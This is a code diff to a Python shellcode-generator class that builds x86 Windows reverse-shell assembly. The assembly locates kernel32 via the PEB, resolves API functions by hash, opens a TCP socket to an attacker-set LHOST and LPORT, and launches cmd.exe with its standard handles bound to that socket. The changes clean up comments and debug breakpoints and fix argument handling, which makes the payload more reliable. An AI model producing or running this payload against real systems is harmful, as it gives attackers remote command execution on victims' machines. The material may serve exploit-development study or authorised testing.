@@ -96,11 +96,11 @@ class Shellcode():
             "WSASocketA"                    : 0x000,
             "connect"                       : 0x000,
             # -------------- VARIABLES --------------
-            "functionName"                  : 0x020, # TODO: make dynamic variables based on 0x000 vs "BUFFER"
+            "functionName"                  : 0x020,
             "wsaData"                       : 0x000,
             "name"                          : 0x010,
             "lpStartupInfo"                 : ctypes.sizeof(_STARTUPINFOA),
-            "lpCommandLine"                 : len("cmd "),
+            "lpCommandLine"                 : len("cmd\x00"),
             "lpProcessInformation"          : 0x000,
         }
 
@@ -156,13 +156,10 @@ class Shellcode():
         """Generates stub for obtaining the base address of Kernel32.dll
         """
 
-        print(f"[DEBUG] _PEB.Ldr.offset: {hex(_PEB.Ldr.offset)}")
-
         stub = f"""
 getKernel32:
     push ebp
     mov ebp, esp
-
     mov dl, 0x4b
 getPEB:
     xor ebx, ebx
@@ -179,7 +176,7 @@ search:
     jne search
     cmp [esi], dl
     jne search
-
+found:
     leave
     ret
         """
@@ -194,12 +191,10 @@ search:
 lookupFunction:
     push ebp
     mov ebp, esp
-
     sub esp, 0x08
     xor ebx, ebx
-    mov [ebp + 0x08], ebx ; temporary register
-    mov [ebp + 0x0C], edx ; function hash
-
+    mov [ebp + 0x08], ebx       ; [EBP+0x08] will serve as a temporary register (x64 has less registers)
+    mov [ebp + 0x0C], edx       ; Argv passed into lookupFunction
     mov ebx, [edi + {_IMAGE_DOS_HEADER.e_lfanew.offset}]
     add ebx, {_IMAGE_NT_HEADERS.OptionalHeader.offset + _IMAGE_OPTIONAL_HEADER.DataDirectory.offset}
     add ebx, edi
@@ -210,7 +205,7 @@ lookupFunction:
     mov edx, edi
     add edx, eax
     mov ecx, [ebx + {_IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
-    mov [ebp + 0x08], ebx ; backup ebx 
+    mov [ebp + 0x08], ebx       ; Backup EBX since we are going to XOR it
 parseNames:
     jecxz error
     dec ecx
@@ -231,16 +226,15 @@ calcDone:
     cmp ebx, [ebp + 0x0C]
     jnz parseNames
 findAddress:
-    mov ebx, [ebp + 0x08] ; restore ebx
-    mov edx, [ebx + {_IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}] ; r8
-    add edx, edi ; r8
+    mov ebx, [ebp + 0x08]       ; Restore EBX value prevously saved
+    mov edx, [ebx + {_IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
+    add edx, edi
     xor eax, eax
-    mov ax, [edx + ecx * 2] ; r8
-    mov edx, [ebx + {_IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}] ; r8d
-    add edx, edi ; r8
-    mov eax, [edx + eax * 4] ; r8
+    mov ax, [edx + ecx * 2]
+    mov edx, [ebx + {_IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
+    add edx, edi
+    mov eax, [edx + eax * 4]
     add eax, edi
-
 error:
     leave
     ret
@@ -319,11 +313,10 @@ get_{imports[func]}:
 
         shellcode = f"""
 _start:
-    pushad    ; Save registers
     mov ebp, esp
     sub esp, {self.stack_space}
 
-memsetBUFFER_0:
+memsetFuncBuffer:
     xor eax, eax
     xor ecx, ecx
     lea edi, [ebp + {self.storage_offsets["functionName"]}]
@@ -361,27 +354,18 @@ call_WSAStartup:
 call_WSASocketA:
     mov eax, [ebp + {self.storage_offsets['WSASocketA']}]
     xor ecx, ecx
-
     push ecx
-
     push ecx
-
     push ecx
-
     mov cl, {IPPROTO_TCP}
     push ecx
-
     mov cl, {SOCK_STREAM}
     push ecx
-
     mov cl, {AF_INET}
     push ecx
-
     call eax
 
-    ;int3
-
-    mov esi, eax ; save the socket file descriptor (sockfd)
+    mov esi, eax ; Save the socket file descriptor (sockfd)
 
 ; EAX => connect([in] SOCKET s,
 ;                [in] const sockaddr *name,
@@ -390,30 +374,28 @@ call_connect:
     xor ecx, ecx
     mov cl, {ctypes.sizeof(sockaddr)}
     push ecx
-
     mov dword ptr [ebp + {self.storage_offsets['name'] + 0x04}], {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}
     mov dword ptr [ebp + {self.storage_offsets['name']}], 0x{struct.pack('<H', lport).hex()}0002
     lea ecx, [ebp + {self.storage_offsets['name']}]
     push ecx
-
     push esi
-
     mov eax, [ebp + {self.storage_offsets['connect']}]
-
     call eax
 
 ; [EBX] => typedef struct _STARTUPINFOA {{ }}
 setup_STARTUPINFOA:
     lea ebx, [ebp + {self.storage_offsets['lpStartupInfo']}]
+
+memsetStructBuffer:
     lea edi, [ebp + {self.storage_offsets['lpStartupInfo']}]
     xor eax, eax
     xor ecx, ecx
-    mov cl, {int(ctypes.sizeof(_STARTUPINFOA) / 0x04)}
+    mov cl, {int( ctypes.sizeof(_STARTUPINFOA) / 0x04 )}
     rep stosd
 
-    mov al, {ctypes.sizeof(_STARTUPINFOA)}        ; lpStartInfo.cb = sizeof(_STARTUPINFO)
+initMembers:
+    mov al, {ctypes.sizeof(_STARTUPINFOA)}
     mov [ebx], eax
-
     mov eax, {STARTF_USESTDHANDLES}
     mov [ebx + {_STARTUPINFOA.dwFlags.offset}], eax
     mov [ebx + {_STARTUPINFOA.hStdInput.offset}], esi
@@ -430,34 +412,24 @@ setup_STARTUPINFOA:
 ;                       [in, optional]      LPCSTR                lpCurrentDirectory,
 ;                       [in]                LPSTARTUPINFOA        lpStartupInfo,
 ;                       [out]               LPPROCESS_INFORMATION lpProcessInformation);
-    ;int3
 call_CreateProccessA:
-    push ebx ; lpProcessInformation
-
+    lea ecx, [ebp + {self.storage_offsets['lpProcessInformation']}]
+    push ecx
     push ebx
-
     xor ecx, ecx
-    push ecx ; lpCurrentDirectory
-
-    push ecx ; lpEnvironment
-
+    push ecx
+    push ecx
+    push ecx
     inc ecx
-    push ecx ; dwCreationFlags
-
+    push ecx
     dec ecx
-    push ecx ; bInheritHandles
-
-    push ecx ; lpThreadAttributes
-
-    push ecx ; lpProcessAttributes
-
+    push ecx
+    push ecx
     lea ecx, [ebp + {self.storage_offsets['lpCommandLine']}]
     mov dword ptr [ecx], 0x646d63
-    push ecx ; lpCommandLine
-
+    push ecx
     xor ecx, ecx
-    push ecx ; lpApplicationName
-
+    push ecx
     mov eax, [ebp + {self.storage_offsets['CreateProcessA']}]
     call eax
 
@@ -472,8 +444,6 @@ call_TerminateProcess:
 
     mov eax, [ebp + {self.storage_offsets['TerminateProcess']}]
     call eax
-
-    ret
 """
 
         shellcode += self.get_kernel32()
